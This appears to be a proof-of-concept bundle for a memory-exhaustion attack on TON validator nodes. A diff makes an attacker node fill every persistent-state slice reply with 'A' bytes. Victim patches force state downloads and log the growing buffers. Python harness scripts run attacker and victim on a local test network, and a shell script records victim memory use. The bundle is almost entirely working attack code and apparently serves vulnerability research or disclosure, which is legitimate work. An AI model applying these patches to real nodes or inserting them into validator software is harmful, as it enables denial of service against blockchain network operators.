@@ -1,0 +1,629 @@
+===== FILE: malicious_responder_poc.diff =====
+diff --git a/validator/full-node-shard.cpp b/validator/full-node-shard.cpp
+index 000000000..000000000 100644
+--- a/validator/full-node-shard.cpp
++++ b/validator/full-node-shard.cpp
+@@ -40,6 +40,8 @@
+ #include "full-node-shard.hpp"
+ #include "overlays.h"
+ 
++#include <cstdlib>
++
+ namespace ton {
+ 
+ namespace validator {
+@@ -699,13 +701,19 @@ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNod
+ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNode_downloadPersistentStateSliceV2 &query,
+                                       td::Promise<td::BufferSlice> promise) {
+   auto [block_id, mc_block_id, state_type] = persistent_state_from_v2_query(query);
+   VLOG(FULL_NODE_DEBUG) << "Got query downloadPersistentStateSlice " << block_id << " " << mc_block_id << " ("
+                         << persistent_state_type_to_string(block_id.shard_full(), state_type) << ") " << query.offset_
+                         << " " << query.max_size_ << " from " << src;
+   if (query.max_size_ < 0 || query.max_size_ > (1 << 24)) {
+     promise.set_error(td::Status::Error(ErrorCode::protoviolation, "invalid max_size"));
+     return;
+   }
++  if (std::getenv("TON_POC_MALICIOUS_STATE_SLICE") != nullptr) {
++    td::BufferSlice data{static_cast<size_t>(query.max_size_)};
++    data.as_slice().fill('A');
++    promise.set_value(std::move(data));
++    return;
++  }
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::BufferSlice> R) mutable {
+         if (R.is_error()) {
+diff --git a/validator/full-node-master.cpp b/validator/full-node-master.cpp
+index 000000000..000000000 100644
+--- a/validator/full-node-master.cpp
++++ b/validator/full-node-master.cpp
+@@ -27,6 +27,8 @@
+ #include "full-node-master.hpp"
+ #include "full-node-shard-queries.hpp"
+ 
++#include <cstdlib>
++
+ namespace ton {
+ 
+ namespace validator {
+@@ -385,6 +387,12 @@ void FullNodeMasterImpl::process_query(adnl::AdnlNodeIdShort src,
+ void FullNodeMasterImpl::process_query(adnl::AdnlNodeIdShort src,
+                                        ton_api::tonNode_downloadPersistentStateSliceV2 &query,
+                                        td::Promise<td::BufferSlice> promise) {
++  if (std::getenv("TON_POC_MALICIOUS_STATE_SLICE") != nullptr && query.max_size_ > 0 && query.max_size_ <= (1 << 24)) {
++    td::BufferSlice data{static_cast<size_t>(query.max_size_)};
++    data.as_slice().fill('A');
++    promise.set_value(std::move(data));
++    return;
++  }
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::BufferSlice> R) mutable {
+         if (R.is_error()) {
+
+===== FILE: ps1_attacker_patch_applied_linux.diff =====
+diff --git a/validator/full-node-master.cpp b/validator/full-node-master.cpp
+index 22567f91..3d718915 100644
+--- a/validator/full-node-master.cpp
++++ b/validator/full-node-master.cpp
+@@ -27,6 +27,8 @@
+ #include "full-node-master.hpp"
+ #include "full-node-shard-queries.hpp"
+ 
++#include <cstdlib>
++
+ namespace ton {
+ 
+ namespace validator {
+@@ -385,6 +387,12 @@ void FullNodeMasterImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNo
+ void FullNodeMasterImpl::process_query(adnl::AdnlNodeIdShort src,
+                                        ton_api::tonNode_downloadPersistentStateSliceV2 &query,
+                                        td::Promise<td::BufferSlice> promise) {
++  if (std::getenv("TON_POC_MALICIOUS_STATE_SLICE") != nullptr && query.max_size_ > 0 && query.max_size_ <= (1 << 24)) {
++    td::BufferSlice data{static_cast<size_t>(query.max_size_)};
++    data.as_slice().fill('A');
++    promise.set_value(std::move(data));
++    return;
++  }
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::BufferSlice> R) mutable {
+         if (R.is_error()) {
+diff --git a/validator/full-node-shard.cpp b/validator/full-node-shard.cpp
+index 67ad60ba..7d9b9f9e 100644
+--- a/validator/full-node-shard.cpp
++++ b/validator/full-node-shard.cpp
+@@ -42,6 +42,8 @@
+ #include "full-node-shard.hpp"
+ #include "overlays.h"
+ 
++#include <cstdlib>
++
+ namespace ton {
+ 
+ namespace validator {
+@@ -706,6 +708,12 @@ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNod
+     promise.set_error(td::Status::Error(ErrorCode::protoviolation, "invalid max_size"));
+     return;
+   }
++  if (std::getenv("TON_POC_MALICIOUS_STATE_SLICE") != nullptr) {
++    td::BufferSlice data{static_cast<size_t>(query.max_size_)};
++    data.as_slice().fill('A');
++    promise.set_value(std::move(data));
++    return;
++  }
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::BufferSlice> R) mutable {
+         if (R.is_error()) {
+
+===== FILE: ps1_full_instrumentation_applied_linux_final.diff =====
+diff --git a/validator/full-node-master.cpp b/validator/full-node-master.cpp
+index 22567f91..66b58e6e 100644
+--- a/validator/full-node-master.cpp
++++ b/validator/full-node-master.cpp
+@@ -27,6 +27,8 @@
+ #include "full-node-master.hpp"
+ #include "full-node-shard-queries.hpp"
+ 
++#include <cstdlib>
++
+ namespace ton {
+ 
+ namespace validator {
+@@ -385,6 +387,16 @@ void FullNodeMasterImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNo
+ void FullNodeMasterImpl::process_query(adnl::AdnlNodeIdShort src,
+                                        ton_api::tonNode_downloadPersistentStateSliceV2 &query,
+                                        td::Promise<td::BufferSlice> promise) {
++  if (std::getenv("TON_POC_MALICIOUS_STATE_SLICE") != nullptr && query.max_size_ > 0 && query.max_size_ <= (1 << 24)) {
++    LOG(ERROR) << "PS1_ATTACKER master got_downloadPersistentStateSliceV2 src=" << src
++               << " offset=" << query.offset_ << " max_size=" << query.max_size_;
++    td::BufferSlice data{static_cast<size_t>(query.max_size_)};
++    data.as_slice().fill('A');
++    LOG(ERROR) << "PS1_ATTACKER master sent_full_slice offset=" << query.offset_
++               << " size=" << data.size();
++    promise.set_value(std::move(data));
++    return;
++  }
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::BufferSlice> R) mutable {
+         if (R.is_error()) {
+diff --git a/validator/full-node-shard.cpp b/validator/full-node-shard.cpp
+index 67ad60ba..cd412c64 100644
+--- a/validator/full-node-shard.cpp
++++ b/validator/full-node-shard.cpp
+@@ -42,6 +42,8 @@
+ #include "full-node-shard.hpp"
+ #include "overlays.h"
+ 
++#include <cstdlib>
++
+ namespace ton {
+ 
+ namespace validator {
+@@ -706,6 +708,16 @@ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNod
+     promise.set_error(td::Status::Error(ErrorCode::protoviolation, "invalid max_size"));
+     return;
+   }
++  if (std::getenv("TON_POC_MALICIOUS_STATE_SLICE") != nullptr) {
++    LOG(ERROR) << "PS1_ATTACKER shard got_downloadPersistentStateSliceV2 src=" << src
++               << " offset=" << query.offset_ << " max_size=" << query.max_size_;
++    td::BufferSlice data{static_cast<size_t>(query.max_size_)};
++    data.as_slice().fill('A');
++    LOG(ERROR) << "PS1_ATTACKER shard sent_full_slice offset=" << query.offset_
++               << " size=" << data.size();
++    promise.set_value(std::move(data));
++    return;
++  }
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::BufferSlice> R) mutable {
+         if (R.is_error()) {
+@@ -1014,10 +1026,89 @@ void FullNodeShardImpl::send_broadcast(BlockBroadcast broadcast) {
+     UNREACHABLE();
+     return;
+   }
++
++  if (std::getenv("TON_POC_FORCE_VICTIM_STATE_DOWNLOAD") != nullptr) {
++    static bool ps1_forced_broadcast_state_download_started = false;
++    if (!ps1_forced_broadcast_state_download_started) {
++      auto &b = choose_neighbour();
++      if (!b.adnl_id.is_zero()) {
++        ps1_forced_broadcast_state_download_started = true;
++        LOG(ERROR) << "PS1_VICTIM force_start_persistent_download_broadcast block=" << broadcast.block_id
++                   << " peer=" << b.adnl_id;
++        td::actor::create_actor<DownloadState>(
++            PSTRING() << "ps1broadcastforcedownloadstate" << broadcast.block_id.id,
++            broadcast.block_id,
++            broadcast.block_id,
++            UnsplitStateType{},
++            adnl_id_,
++            overlay_id_,
++            b.adnl_id,
++            0,
++            td::Timestamp::in(60.0),
++            validator_manager_,
++            rldp2_,
++            overlays_,
++            adnl_,
++            client_,
++            td::Promise<td::BufferSlice>())
++            .release();
++      } else {
++        LOG(ERROR) << "PS1_VICTIM force_start_persistent_download_broadcast no_neighbour block="
++                   << broadcast.block_id;
++          LOG(ERROR) << "PS1_VICTIM no_neighbour_zero_peer_fallback_real block="
++                     << broadcast.block_id;
++          td::actor::create_actor<DownloadState>(
++              PSTRING() << "ps1broadcastforcedownloadstate" << broadcast.block_id.id,
++              broadcast.block_id,
++              broadcast.block_id,
++              UnsplitStateType{},
++              adnl_id_,
++              overlay_id_,
++              adnl::AdnlNodeIdShort::zero(),
++              0,
++              td::Timestamp::in(60.0),
++              validator_manager_,
++              rldp2_,
++              overlays_,
++              adnl_,
++              client_,
++              [](td::Result<td::BufferSlice> R) {
++                if (R.is_error()) {
++                  LOG(ERROR) << "PS1_VICTIM no_neighbour_zero_peer_result error="
++                             << R.move_as_error();
++                } else {
++                  auto data = R.move_as_ok();
++                  LOG(ERROR) << "PS1_VICTIM no_neighbour_zero_peer_result ok size="
++                             << data.size();
++                }
++              })
++              .release();
++      }
++    }
++  }
++
+   VLOG(FULL_NODE_DEBUG) << "Sending block broadcast in private overlay: " << broadcast.block_id;
+   auto B = serialize_block_broadcast(broadcast, k_called_from_public);
+   if (B.is_error()) {
+     VLOG(FULL_NODE_WARNING) << "failed to serialize block broadcast: " << B.move_as_error();
++    LOG(ERROR) << "PS1_VICTIM force_start_persistent_download_broadcast zero_peer_fallback block="
++               << broadcast.block_id;
++    td::actor::create_actor<DownloadState>(
++        PSTRING() << "ps1broadcastforcedownloadstate" << broadcast.block_id,
++        broadcast.block_id, broadcast.block_id, UnsplitStateType{}, adnl_id_, overlay_id_,
++        adnl::AdnlNodeIdShort::zero(), 0, td::Timestamp::in(60.0), validator_manager_,
++        rldp2_, overlays_, adnl_, client_,
++        [](td::Result<td::BufferSlice> R) {
++          if (R.is_error()) {
++            LOG(ERROR) << "PS1_VICTIM force_state_download_zero_peer_result error="
++                       << R.move_as_error();
++          } else {
++            auto data = R.move_as_ok();
++            LOG(ERROR) << "PS1_VICTIM force_state_download_zero_peer_result ok size="
++                       << data.size();
++          }
++        })
++        .release();
+     return;
+   }
+   auto payload = B.move_as_ok();
+@@ -1029,6 +1120,19 @@ void FullNodeShardImpl::send_broadcast(BlockBroadcast broadcast) {
+ void FullNodeShardImpl::download_block(BlockIdExt id, td::uint32 priority, td::Timestamp timeout,
+                                        td::Promise<ReceivedBlock> promise) {
+   auto &b = choose_neighbour();
++  if (std::getenv("TON_POC_FORCE_VICTIM_STATE_DOWNLOAD") != nullptr) {
++    static bool ps1_forced_state_download_started = false;
++    if (!ps1_forced_state_download_started && !b.adnl_id.is_zero()) {
++      ps1_forced_state_download_started = true;
++      LOG(ERROR) << "PS1_VICTIM force_start_persistent_download block=" << id
++                 << " peer=" << b.adnl_id;
++      td::actor::create_actor<DownloadState>(PSTRING() << "ps1forcedownloadstate" << id.id, id, id, UnsplitStateType{},
++                                             adnl_id_, overlay_id_, b.adnl_id, priority, td::Timestamp::in(60.0),
++                                             validator_manager_, rldp2_, overlays_, adnl_, client_,
++                                             td::Promise<td::BufferSlice>())
++          .release();
++    }
++  }
+   td::actor::create_actor<DownloadBlockNew>("downloadreq", id, adnl_id_, overlay_id_, b.adnl_id, priority, timeout,
+                                             validator_manager_, rldp2_, overlays_, adnl_, client_,
+                                             create_neighbour_promise(b, std::move(promise)))
+diff --git a/validator/net/download-state.cpp b/validator/net/download-state.cpp
+index 869eecc0..9b8415b9 100644
+--- a/validator/net/download-state.cpp
++++ b/validator/net/download-state.cpp
+@@ -17,6 +17,8 @@
+     Copyright 2017-2020 Telegram Systems LLP
+ */
+ #include "td/utils/overloaded.h"
++
++#include <cstdlib>
+ #include "ton/ton-io.hpp"
+ #include "ton/ton-tl.hpp"
+ 
+@@ -135,6 +137,18 @@ void DownloadState::got_node_to_download(adnl::AdnlNodeIdShort node) {
+   LOG(WARNING) << "downloading state " << block_id_ << " ("
+                << persistent_state_type_to_string(block_id_.shard_full(), type_) << ") from " << download_from_;
+ 
++  if (std::getenv("TON_POC_FORCE_VICTIM_STATE_SLICES") != nullptr) {
++    total_size_ = 1;
++    LOG(ERROR) << "PS1_VICTIM force_direct_slice_loop block=" << block_id_
++               << " mc=" << masterchain_block_id_
++               << " effective_shard=" << effective_shard_
++               << " peer=" << download_from_;
++    LOG(ERROR) << "PS1_VICTIM force_seed_slice_loop total_size=" << total_size_;
++    td::BufferSlice seed;
++    got_block_state_part(std::move(seed), 0);
++    return;
++  }
++
+   td::Promise<td::BufferSlice> P;
+   td::BufferSlice query;
+ 
+@@ -269,10 +283,32 @@ void DownloadState::got_total_size(td::uint64 size) {
+ }
+ 
+ void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 requested_size) {
++  auto ps1_data_size = data.size();
++  auto ps1_sum_before = sum_;
+   bool last_part = data.size() < requested_size;
+   sum_ += data.size();
+   parts_.push_back(std::move(data));
+ 
++  if (const char *max_parts_env = std::getenv("TON_POC_MAX_VICTIM_PARTS")) {
++    auto max_parts = static_cast<td::uint64>(std::strtoull(max_parts_env, nullptr, 10));
++    if (max_parts > 0 && parts_.size() >= max_parts) {
++      LOG(ERROR) << "PS1_VICTIM force_stop_after_parts parts=" << parts_.size()
++                 << " sum=" << sum_;
++      abort_query(td::Status::Error(ErrorCode::timeout, "PS1 forced stop after max victim parts"));
++      return;
++    }
++  }
++  if (ps1_data_size > 0 || requested_size > 0) {
++    LOG(ERROR) << "PS1_VICTIM part_received requested_size=" << requested_size
++               << " data_size=" << ps1_data_size
++               << " sum_before=" << ps1_sum_before
++               << " sum_after=" << sum_
++               << " parts=" << parts_.size()
++               << " total_size=" << total_size_
++               << " last_part=" << last_part
++               << " download_from=" << download_from_;
++  }
++
+   double elapsed = prev_logged_timer_.elapsed();
+   if (elapsed > 5.0) {
+     prev_logged_timer_ = td::Timer();
+@@ -297,6 +333,8 @@ void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 reques
+   }
+ 
+   if (last_part) {
++    LOG(ERROR) << "PS1_VICTIM eof_copy sum=" << sum_
++               << " parts=" << parts_.size();
+     status_.set_status(PSTRING() << block_id_.id << " : " << sum_ << " bytes, finishing");
+     td::BufferSlice res{td::narrow_cast<std::size_t>(sum_)};
+     auto S = res.as_slice();
+@@ -323,6 +361,8 @@ void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 reques
+       create_tl_object<ton_api::tonNode_persistentStateIdV2>(
+           create_tl_block_id(block_id_), create_tl_block_id(masterchain_block_id_), effective_shard_),
+       sum_, part_size);
++  LOG(ERROR) << "PS1_VICTIM next_request offset=" << sum_
++             << " part_size=" << part_size << " peer=" << download_from_;
+   if (client_.empty()) {
+     td::actor::send_closure(overlays_, &overlay::Overlays::send_query_via, download_from_, local_id_, overlay_id_,
+                             "download state", std::move(P), td::Timestamp::in(20.0), std::move(query), part_size + 1024,
+
+===== FILE: ps1_measure_victim_rss.sh =====
+#!/usr/bin/env bash
+set -u
+
+OUT="artifacts/ps1_persistent_state_oom/ps1_measured_rss_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$OUT"
+
+RUNNER="artifacts/ps1_persistent_state_oom/ps1_tontester_forced_victim_slice_probe_long.py"
+
+echo "OUT=$OUT" | tee "$OUT/summary.txt"
+echo "RUNNER=$RUNNER" | tee -a "$OUT/summary.txt"
+
+(
+  timeout 600s python3 "$RUNNER"
+  echo "PS1_MEASURED_RUN_RC=$?"
+) 2>&1 | tee "$OUT/run.log" &
+
+RUN_PID=$!
+
+echo "RUN_PID=$RUN_PID" | tee -a "$OUT/summary.txt"
+echo "time,pid,rss_kb,vsz_kb,cmd" > "$OUT/rss_samples.csv"
+
+while kill -0 "$RUN_PID" 2>/dev/null; do
+  for p in $(pgrep -f "validator-engine" || true); do
+    ps -o rss=,vsz=,cmd= -p "$p" | awk -v t="$(date +%s)" -v pid="$p" '
+      {
+        rss=$1; vsz=$2;
+        $1=""; $2="";
+        sub(/^  */, "", $0);
+        print t "," pid "," rss "," vsz "," $0;
+      }
+    ' >> "$OUT/rss_samples.csv"
+  done
+  sleep 0.25
+done
+
+wait "$RUN_PID" || true
+
+echo "=== markers ===" | tee -a "$OUT/summary.txt"
+grep -nE "PS1_ATTACKER|PS1_VICTIM part_received|MC_BLOCK_3_REACHED|PS1_.*RC" "$OUT/run.log" \
+  | tee "$OUT/markers.txt" | tail -40 | tee -a "$OUT/summary.txt"
+
+echo "=== max rss by pid ===" | tee -a "$OUT/summary.txt"
+awk -F, '
+  NR>1 {
+    if ($3 > max[$2]) max[$2]=$3
+  }
+  END {
+    for (pid in max) printf("pid=%s max_rss_kb=%s max_rss_mb=%.2f\n", pid, max[pid], max[pid]/1024)
+  }
+' "$OUT/rss_samples.csv" | sort | tee -a "$OUT/summary.txt"
+
+echo "=== victim accumulation max ===" | tee -a "$OUT/summary.txt"
+grep -oE "sum_after=[0-9]+|parts=[0-9]+" "$OUT/run.log" | awk '
+  /sum_after=/ { split($0,a,"="); if (a[2] > maxsum) maxsum=a[2] }
+  /parts=/ { split($0,a,"="); if (a[2] > maxparts) maxparts=a[2] }
+  END { print "max_sum_after=" maxsum; print "max_parts=" maxparts }
+' | tee -a "$OUT/summary.txt"
+
+echo "DONE_OUT=$OUT"
+
+===== FILE: ps1_tontester_forced_victim_slice_probe_long.py =====
+import asyncio
+import logging
+import shutil
+from pathlib import Path
+
+from tontester.install import Install
+from tontester.network import FullNode, Network, StartOptions
+
+
+async def main():
+    repo_root = Path(__file__).resolve().parents[2]
+    art = repo_root / "artifacts/ps1_persistent_state_oom"
+    working_dir = art / "ps1_tontester_forced_victim_slice.network"
+
+    shutil.rmtree(working_dir, ignore_errors=True)
+    working_dir.mkdir(parents=True, exist_ok=True)
+
+    logging.basicConfig(
+        level=logging.INFO,
+        format="[%(levelname)s][%(asctime)s][%(name)s] %(message)s",
+        datefmt="%Y-%m-%d %H-%M-%S",
+    )
+
+    install = Install(repo_root / "build", repo_root)
+    install.tonlibjson.client_set_verbosity_level(3)
+
+    async with Network(install, working_dir) as network:
+        dht = network.create_dht_node()
+        network.config.shard_validators = 2
+
+        attacker: FullNode = network.create_full_node()
+        victim: FullNode = network.create_full_node()
+
+        attacker.make_initial_validator()
+        victim.make_initial_validator()
+
+        attacker.announce_to(dht)
+        victim.announce_to(dht)
+
+        async with asyncio.TaskGroup() as tg:
+            tg.create_task(dht.run(StartOptions(verbosity=4, console_verbosity=4, threads=1)))
+            tg.create_task(attacker.run(StartOptions(
+                verbosity=4,
+                console_verbosity=4,
+                threads=2,
+                env={
+                    "TON_POC_MALICIOUS_STATE_SLICE": "1",
+                },
+            )))
+            tg.create_task(victim.run(StartOptions(
+                verbosity=4,
+                console_verbosity=4,
+                threads=2,
+                env={
+                    "TON_POC_FORCE_VICTIM_STATE_DOWNLOAD": "1",
+                    "TON_POC_FORCE_VICTIM_STATE_SLICES": "1",
+                    "TON_POC_MAX_VICTIM_PARTS": "256",
+                },
+            )))
+
+        print("NETWORK_STARTED")
+        print(f"WORKDIR={working_dir}")
+
+        await network.wait_mc_block(seqno=8)
+        print("MC_BLOCK_8_REACHED")
+
+        await asyncio.sleep(120)
+        print("LONG_SLEEP_DONE")
+
+        print("ATTACKER_LOG=" + str(attacker.log_path))
+        print("VICTIM_LOG=" + str(victim.log_path))
+
+
+if __name__ == "__main__":
+    asyncio.run(asyncio.wait_for(main(), 10 * 60))
+
+===== FILE: ps1_tontester_forced_victim_slice_probe.py =====
+import asyncio
+import logging
+import shutil
+from pathlib import Path
+
+from tontester.install import Install
+from tontester.network import FullNode, Network, StartOptions
+
+
+async def main():
+    repo_root = Path(__file__).resolve().parents[2]
+    art = repo_root / "artifacts/ps1_persistent_state_oom"
+    working_dir = art / "ps1_tontester_forced_victim_slice.network"
+
+    shutil.rmtree(working_dir, ignore_errors=True)
+    working_dir.mkdir(parents=True, exist_ok=True)
+
+    logging.basicConfig(
+        level=logging.INFO,
+        format="[%(levelname)s][%(asctime)s][%(name)s] %(message)s",
+        datefmt="%Y-%m-%d %H-%M-%S",
+    )
+
+    install = Install(repo_root / "build", repo_root)
+    install.tonlibjson.client_set_verbosity_level(3)
+
+    async with Network(install, working_dir) as network:
+        dht = network.create_dht_node()
+        network.config.shard_validators = 2
+
+        attacker: FullNode = network.create_full_node()
+        victim: FullNode = network.create_full_node()
+
+        attacker.make_initial_validator()
+        victim.make_initial_validator()
+
+        attacker.announce_to(dht)
+        victim.announce_to(dht)
+
+        async with asyncio.TaskGroup() as tg:
+            tg.create_task(dht.run(StartOptions(verbosity=4, console_verbosity=4, threads=1)))
+            tg.create_task(attacker.run(StartOptions(
+                verbosity=4,
+                console_verbosity=4,
+                threads=2,
+                env={
+                    "TON_POC_MALICIOUS_STATE_SLICE": "1",
+                },
+            )))
+            tg.create_task(victim.run(StartOptions(
+                verbosity=4,
+                console_verbosity=4,
+                threads=2,
+                env={
+                    "TON_POC_FORCE_VICTIM_STATE_DOWNLOAD": "1",
+                    "TON_POC_FORCE_VICTIM_STATE_SLICES": "1",
+                    "TON_POC_MAX_VICTIM_PARTS": "64",
+                },
+            )))
+
+        print("NETWORK_STARTED")
+        print(f"WORKDIR={working_dir}")
+
+        await network.wait_mc_block(seqno=3)
+        print("MC_BLOCK_3_REACHED")
+
+        await asyncio.sleep(20)
+        print("SLEEP_DONE")
+
+        print("ATTACKER_LOG=" + str(attacker.log_path))
+        print("VICTIM_LOG=" + str(victim.log_path))
+
+
+if __name__ == "__main__":
+    asyncio.run(asyncio.wait_for(main(), 5 * 60))
+
+===== FILE: ps1_victim_downloadstate_logging.diff =====
+diff --git a/validator/net/download-state.cpp b/validator/net/download-state.cpp
+--- a/validator/net/download-state.cpp
++++ b/validator/net/download-state.cpp
+@@ -269,9 +269,21 @@ void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 reques
+ }
+
+ void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 requested_size) {
++  auto ps1_data_size = data.size();
++  auto ps1_sum_before = sum_;
+   bool last_part = data.size() < requested_size;
+   sum_ += data.size();
+   parts_.push_back(std::move(data));
++  if (ps1_data_size > 0 || requested_size > 0) {
++    LOG(ERROR) << "PS1_VICTIM part_received requested_size=" << requested_size
++               << " data_size=" << ps1_data_size
++               << " sum_before=" << ps1_sum_before
++               << " sum_after=" << sum_
++               << " parts=" << parts_.size()
++               << " total_size=" << total_size_
++               << " last_part=" << last_part
++               << " download_from=" << download_from_;
++  }
+   td::StringBuilder sb;
+   sb << "downloaded persistent state " << block_id_.to_str() << " " << masterchain_block_id_.to_str() << ": "
+      << td::format::as_size(sum_);
+@@ -296,6 +308,8 @@ void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 reques
+   }
+
+   if (last_part) {
++    LOG(ERROR) << "PS1_VICTIM eof_copy sum=" << sum_
++               << " parts=" << parts_.size();
+     td::BufferSlice res{td::narrow_cast<std::size_t>(sum_)};
+     auto S = res.as_slice();
+     for (auto &p : parts_) {
+@@ -318,6 +332,8 @@ void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 reques
+       create_serialize_tl_object<ton_api::tonNode_downloadPersistentStateSliceV2>(
+           create_tl_block_id(block_id_), create_tl_block_id(masterchain_block_id_), state_type_to_tl(), sum_, part_size);
++  LOG(ERROR) << "PS1_VICTIM next_request offset=" << sum_
++             << " part_size=" << part_size << " peer=" << download_from_;
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), requested_size = part_size](td::Result<td::BufferSlice> R) {
+         if (R.is_error()) {
+
